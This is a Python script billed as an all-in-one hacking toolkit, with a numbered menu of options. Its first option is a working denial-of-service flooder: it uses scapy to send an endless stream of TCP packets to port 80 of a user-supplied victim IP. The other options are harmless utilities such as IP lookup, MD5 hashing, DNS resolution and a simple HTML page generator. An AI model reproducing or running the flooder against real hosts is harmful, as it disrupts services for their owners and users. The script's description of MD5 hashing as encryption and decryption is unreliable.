
print("YZ-AIO")
print("YOU WILL FIND HERE ALL TOOLS YOU WILL NEED FOR HACKING")
print("SOON I WILL ADD MORE")
print(":)")
print ("1 for DOS")
print("2 to know your localhost ip address  ")
print("3 to know your public ip address ")
print("4 to encrypt md5")
print("5 to create index")
print("6 to decrypt md5")
print("7 to get website ip")


x = input(">>> choose number : ")
if x == ("1") :
  import scapy
  from scapy.all import *
  print("YZ-AIO >>> DOS")
  x = input("enter {YOUR} ip address : ")
  y = input("enter VICTIM ip address : ")
  i =10
  while True :
    for source_port in range(1, 5000):
     IP1 = IP(src=x, dst=y)
     TCP1 = TCP(sport=source_port , dport=80)
     packet = IP1 / TCP1
     send(packet, inter=.001)
     print("Attacking...Packet number" , i)
     i += 10

if x == ("2") :
  
  print("YZ-AIO >>> LOCALHOST-I[")
  import socket
  hostname = socket.gethostname()
  yy = socket.gethostbyname(hostname)
  print ("Your localhost ip address : " + yy)
  print ("thx for using my tool :)")
  
if x == ("3") :
  import urllib.request
  print("YZ-AIO >>> public IP ADDRESS FINDER")
  yyy = urllib.request.urlopen("https://ident.me").read().decode("utf8")
  print ("Your  public ip address is : " + yyy)
  print ("thx for choosing my tool :)")

if x == ("4") :
  
  import hashlib
  print("YZ-AIO >>> DECRYPT MD5")
  zxz = input("Enter your text : ")
  xzx = hashlib.md5(zxz.encode())
  print ("encrypted ! : ")
  print(xzx.hexdigest())
  print("Done..Thanks for using my tool")


if x == ("5") :
  
  print("YZ-AIO >>> simple index creator")
  vx = input("Enter index name : ")
  xx = open(vx , "w")
  xzx = input("Enter index title  : ")
  zzz = input("enter h1 text : ")
  xxz = input  ("enter p1 text : ")
  zxx = input ("enter image path or url to put it on index : ")
  cxc = input ("color hex code for background with # : ")
  xx.write('''<html>
  <head>
  <title>''' + xzx + '''</title>
  </head>
  <body style="background-color:'''+ cxc + '"' ''' ''' + '''>'''+'''<br>''''''
  <center>
  <h1>''' + zzz + '''</h1><br>
  <p1>''' + xxz + '''</p1><b>
  <img src = ''' + "'" + zxx + "'" + '''><br>
  ''' ) 
  xx.close()
  print("Done file saved in tool folder")
  print("thanks for using my tool")

if x == ("6") :
  print("YZ-AIO ----> MD5 ---> TEXT")
  print(" to decrypt md5 use this website : ")
  print("https://hashes.com/en/decrypt/hash")

if x == ("7") :
  
  print("YZ-AIO >>> URL TO IP")
  vcv = input("Enter website url without http / https : ")
  import socket
  print ("Done ... ip : " + socket.gethostbyname(vcv))
  print ("thx for choosing my tool :)")
